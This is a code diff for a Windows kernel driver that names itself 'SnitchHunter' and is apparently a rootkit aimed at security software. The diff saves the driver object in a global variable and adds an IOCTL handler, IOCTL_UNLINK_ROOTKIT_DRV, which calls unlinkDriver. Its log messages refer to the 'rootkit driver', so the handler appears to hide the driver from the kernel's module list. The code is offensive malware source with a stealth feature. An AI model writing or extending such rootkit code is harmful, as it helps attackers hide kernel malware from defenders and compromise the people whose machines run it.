@@ -1,5 +1,7 @@
 #include "utils.h"
 
+PDRIVER_OBJECT globDriverObject;
+
 void UnloadMe(PDRIVER_OBJECT);
 NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP);
 NTSTATUS CreateClose(PDEVICE_OBJECT, PIRP);
@@ -419,6 +421,17 @@ NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
             }
 			break;
         }
+        case IOCTL_UNLINK_ROOTKIT_DRV:
+        {
+			status = unlinkDriver(globDriverObject);
+            if (!NT_SUCCESS(status)) {
+                DbgPrintEx(0, 0, "[%s] Failed to unlink rootkit driver\n", DRIVER_NAME);
+            }
+            else {
+                DbgPrintEx(0, 0, "[%s] Successfully unlinked rootkit driver\n", DRIVER_NAME);
+            }
+            break;
+		}
         default:
             status = STATUS_INVALID_DEVICE_REQUEST;
             DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL,
@@ -439,6 +452,8 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 	UNREFERENCED_PARAMETER(RegistryPath);
 
 	DbgPrintEx(0, 0, "[%s] SnitchHunter started hunting snitches. Callback on deez nutz loosers\n", DRIVER_NAME);
+
+	globDriverObject = DriverObject;
 
 
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
